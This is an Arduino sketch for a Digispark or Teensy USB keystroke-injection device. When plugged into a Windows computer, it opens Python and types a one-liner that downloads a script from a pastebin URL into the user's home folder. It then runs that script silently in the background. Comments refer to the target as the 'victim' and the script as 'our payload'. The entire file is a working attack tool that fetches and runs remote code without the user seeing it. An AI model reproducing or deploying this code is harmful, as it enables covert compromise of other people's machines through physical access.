/*============================================================================
MIT License
Copyright (c) 2020 github.com/whyire
                   ___       _                                
              ____/ (_)___ _(_)___  __  _____  _  _____  _____
             / __  / / __ `/ / __ \/ / / / _ \| |/_/ _ \/ ___/
            / /_/ / / /_/ / / /_/ / /_/ /  __/>  </  __/ /__  
            \__,_/_/\__, /_/ .___/\__, /\___/_/|_|\___/\___/  
                   /____/ /_/    /____/ v1.1
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
============================================================================*/

/* SETTINGS */
#define PY_SCRIPT_URL "https://pastebin.com/raw/JMVWuNc5" // Raw text link to python script to run in background on "victim"
#define PY_SCRIPT_NAME "pyscr.py" // Name of script that is saved on "victim"'s user directory

//#define TEENSY // Uncomment if programming a teensy

#define START_DELAY 1200
#define START_MENU_DELAY 600
#define START_MENU_SEARCH_DELAY 150
#define PYTHON_WINDOW_OPEN_DELAY 600

#ifndef TEENSY
  #include "DigiKeyboard.h"
#endif

namespace kbd {
  void print(char* str) {
    //print on both teensy and dspark
    #ifdef TEENSY
      Keyboard.print(str);
    #else
      DigiKeyboard.print(str);
    #endif
  }
  void wait(int t) {
    //delay on both teensy and dspark
    #ifdef TEENSY
      delay(t);
    #else
      DigiKeyboard.delay(t);
    #endif
  }
  void pressKey(int key) {
    #ifdef TEENSY
      Keyboard.press(key);
      Keyboard.release(key);
    #else
      DigiKeyboard.sendKeyStroke(0, key);
    #endif
  }
  void enter() {
    //windows key on both teensy and dspark
    #ifdef TEENSY
      Keyboard.press(KEY_ENTER);
      Keyboard.release(KEY_ENTER);
    #else
      DigiKeyboard.sendKeyStroke(0, KEY_ENTER);
    #endif
  }
}



void setup() {
  /*   Open python prompt   */
  kbd::wait(START_DELAY);
  kbd::pressKey(KEY_LEFT_GUI);
  kbd::wait(START_MENU_DELAY);
  kbd::print("python.exe");
  kbd::wait(START_MENU_SEARCH_DELAY);
  kbd::pressKey(KEY_ENTER);
  kbd::wait(PYTHON_WINDOW_OPEN_DELAY);

  
  /*   Python script   */
  kbd::print({"import subprocess,os,urllib.request as r;" // imports
         "os.chdir(os.path.expanduser('~'));"// Change directory to home as we may not have permission to edit in the python folder Change ~ with | if on uk keyboard with digispark
         "f=open('"});kbd::print(PY_SCRIPT_NAME);kbd::print({"','wb');"// Create the file with the name of PY_SCRIPT_NAME which will run in the background as our payload
         "f.write(r.urlopen('"});kbd::print(PY_SCRIPT_URL);kbd::print({"').read());"
         "f.close();"
         "subprocess.Popen('pythonw.exe "});kbd::print(PY_SCRIPT_NAME);kbd::print({"',creationflags=8,close_fds=True);exit()"}); // Open the script we just made with pythonw (so it runs in background)
  kbd::pressKey(KEY_ENTER);
}void loop() {}
